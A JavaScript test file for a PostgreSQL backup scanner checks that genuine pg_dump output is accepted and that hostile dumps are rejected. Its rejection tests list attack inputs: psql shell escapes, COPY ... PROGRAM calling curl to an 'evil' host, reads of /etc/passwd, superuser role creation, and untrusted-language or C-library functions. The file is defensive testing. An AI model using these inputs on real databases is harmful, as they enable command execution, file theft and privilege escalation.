const test = require('node:test');
const assert = require('node:assert/strict');
const { scanLines } = require('../backupScan');

const scan = text => scanLines(text.split('\n'));
const HEADER = '--\n-- PostgreSQL database dump\n--\n\\restrict AbC123xyz\nSET statement_timeout = 0;\n';
const FOOTER = '\\unrestrict AbC123xyz\n--\n-- PostgreSQL database dump complete\n--\n';

test('what pg_dump writes passes: COPY data (with backslashes), functions, strings', async () => {
  const dump = HEADER + [
    "CREATE FUNCTION public.app_now() RETURNS text LANGUAGE sql AS $$ SELECT to_char(now(), 'YYYY-MM-DD\\HH') $$;",
    "CREATE FUNCTION public.f() RETURNS void LANGUAGE plpgsql AS $_$",
    "BEGIN RAISE NOTICE 'a\\b'; END",
    "$_$;",
    "COMMENT ON TABLE public.tasks IS 'Tasks, incl. ''quoted'' text';",
    "SELECT pg_catalog.set_config('search_path', '', false);",
    "INSERT INTO public.x VALUES (E'line\\nbreak and \\' quote');",
    'COPY public."users" (id, name, notes) FROM stdin;',
    '1\tAlex\tC:\\\\path\\twith tabs \\! not a command',
    '2\tMaria\t\\N',
    '\\.',
    '/* a block',
    '   comment with \\ backslash */',
    'ALTER TABLE ONLY public.users ADD CONSTRAINT users_pkey PRIMARY KEY (id);',
  ].join('\n') + '\n' + FOOTER;
  assert.ok((await scan(dump)).lines > 10);
});

test('psql commands and COPY … PROGRAM are refused', async () => {
  for (const evil of [
    '\\! cat /etc/passwd',
    'SELECT 1; \\connect live_db',
    "\\copy x from program 'id'",
    '\\o | sh',
    "COPY public.x FROM PROGRAM 'curl http://evil';",
    "COPY (SELECT 1) TO\n  PROGRAM 'id';", // over two lines: the statement is checked whole
    'CREATE TABLE t (a int); \\gexec',
  ]) await assert.rejects(scan(HEADER + evil + '\n' + FOOTER), error => error.status === 400, evil);
  // A command hidden after a COPY block ends.
  await assert.rejects(scan(HEADER + 'COPY public.x (a) FROM stdin;\n1\n\\.\n\\! id\n' + FOOTER), /psql command/);
  await assert.rejects(scan('SET client_encoding = \'UTF8\';\n'), /does not start like a PostgreSQL dump/);
  await assert.rejects(scan(HEADER + 'COPY public.x (a) FROM stdin;\n1\n'), /not finished/);
});

test('only the statements pg_dump writes are accepted, wherever the lines break', async () => {
  for (const evil of [
    "COPY public.x\nTO\nPROGRAM\n'id';",
    'DO $$ BEGIN PERFORM 1; END $$;',
    'do\n$x$ BEGIN NULL; END $x$;',
    'SET search_path = public; DO $$ BEGIN NULL; END $$;',
    'SELECT public.evil();',
    'SELECT 1;',
    "COPY public.x FROM '/etc/passwd';",
    "COPY public.x TO '/tmp/out';",
    "ALTER SYSTEM SET archive_command = 'id';",
    "ALTER\n  SYSTEM SET shared_preload_libraries = 'x';",
    'SET ROLE postgres;',
    'SET SESSION AUTHORIZATION postgres;',
    'CREATE ROLE evil SUPERUSER;',
    'GRANT pg_execute_server_program TO app;',
    'GRANT some_role TO recipient_role GRANTED BY "ON";',
    'GRANT some_role TO recipient_role GRANTED BY current_user;',
    'REVOKE some_role FROM recipient_role GRANTED BY "ON";',
    'CREATE EXTENSION dblink;',
    'CREATE EXTENSION IF NOT EXISTS plpython3u;',
    'CREATE FUNCTION public.f() RETURNS int LANGUAGE plpython3u AS $$ import os $$;',
    "CREATE FUNCTION public.f() RETURNS int AS '/tmp/evil.so', 'f' LANGUAGE c;",
    'CREATE LANGUAGE plperlu;',
    "CREATE FUNCTION public.f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN EXECUTE 'SEL' || 'ECT 1'; END $$;",
    "CREATE FUNCTION public.f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN COPY t TO PROGRAM 'id'; END $$;",
    "CREATE TABLE public.t (a text DEFAULT pg_read_file('/etc/passwd'));",
    'CREATE TABLE public.t (a text DEFAULT "pg_read_file"(\'/etc/passwd\'));',
    "INSERT INTO public.t VALUES (lo_import('/etc/passwd'));",
    "CREATE TRIGGER t BEFORE INSERT ON public.x FOR EACH ROW EXECUTE FUNCTION dblink_exec('x');",
    'TRUNCATE public.users;',
    'CALL public.p();',
    "SET x = 'unfinished",
  ]) await assert.rejects(scan(HEADER + evil + '\n' + FOOTER), error => error.status === 400, evil);
});

test('statements pg_dump writes with --clean, including over several lines, pass', async () => {
  const dump = HEADER + [
    'SET default_table_access_method = heap;',
    'DROP INDEX IF EXISTS public.idx_x;',
    'ALTER TABLE IF EXISTS ONLY public.users DROP CONSTRAINT IF EXISTS users_pkey;',
    'CREATE EXTENSION IF NOT EXISTS pg_trgm WITH SCHEMA public;',
    "COMMENT ON EXTENSION pg_trgm IS 'text similarity measurement and index searching based on trigrams';",
    'CREATE FUNCTION public.app_today() RETURNS text',
    '    LANGUAGE plpgsql STABLE',
    '    AS $$',
    '    DECLARE zone text;',
    '    BEGIN',
    "      SELECT value::json->>'timezone' INTO zone FROM settings WHERE key = 'localization_config';",
    "      RETURN to_char(now() AT TIME ZONE COALESCE(NULLIF(zone, ''), 'Asia/Nicosia'), 'YYYY-MM-DD');",
    '    END $$;',
    'CREATE TABLE public.users (',
    '    id integer NOT NULL,',
    "    \"name\" text DEFAULT 'x;y' NOT NULL",
    ');',
    'ALTER TABLE public.users OWNER TO app;',
    'CREATE SEQUENCE public.users_id_seq',
    '    AS integer',
    '    START WITH 1;',
    'ALTER SEQUENCE public.users_id_seq OWNED BY public.users.id;',
    "ALTER TABLE ONLY public.users ALTER COLUMN id SET DEFAULT nextval('public.users_id_seq'::regclass);",
    'COPY public.users (id, name) FROM stdin;',
    '1\tAlex; DROP TABLE x',
    '\\.',
    "SELECT pg_catalog.setval('public.users_id_seq', 1, true);",
    'CREATE INDEX idx_users_name ON public.users USING gin (name public.gin_trgm_ops);',
    'REVOKE USAGE ON SCHEMA public FROM PUBLIC;',
    'GRANT ALL ON SCHEMA public TO PUBLIC;',
  ].join('\n') + '\n' + FOOTER;
  assert.ok((await scan(dump)).lines > 20);
});
